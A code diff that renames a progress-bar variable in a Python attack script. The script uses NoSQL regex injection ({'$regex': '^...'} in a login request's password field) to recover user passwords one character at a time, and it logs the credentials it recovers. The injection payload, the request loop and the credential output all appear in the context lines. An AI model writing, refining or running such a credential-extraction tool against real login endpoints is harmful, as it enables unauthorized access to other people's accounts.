@@ -10,7 +10,7 @@ def def_handler(sig, frame):
 
 signal.signal(signal.SIGINT, def_handler)
 
-def enumeratePassword(url, session, username, p1):
+def enumeratePassword(url, session, username, progress_bar):
     password = ""
     characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
     
@@ -30,7 +30,7 @@ def enumeratePassword(url, session, username, p1):
                 }
             }
             
-            p1.status(f"{{'username': '{username}', 'password': {{'$regex': '^{password}{regex_character}'}}}}")
+            progress_bar.status(f"{{'username': '{username}', 'password': {{'$regex': '^{password}{regex_character}'}}}}")
             
             try:
                 request = session.post(url, json=data, allow_redirects=False, timeout=300)
@@ -87,14 +87,14 @@ def extractPasswords(url, proxy_url=None, user_file=None, usernames_list=None, o
     
     log.info(f"Total users to process: {len(usernames)}")
     
-    p1 = log.progress("Enumerating passwords")
+    progress_bar = log.progress("Enumerating passwords")
     
     credentials = []
     passwords_only = []
     files_created = False
     
     for username in usernames:
-        password = enumeratePassword(url, session, username, p1)
+        password = enumeratePassword(url, session, username, progress_bar)
         
         if password:
             log.success(f"✓ Credentials found -> {username}:{password}")
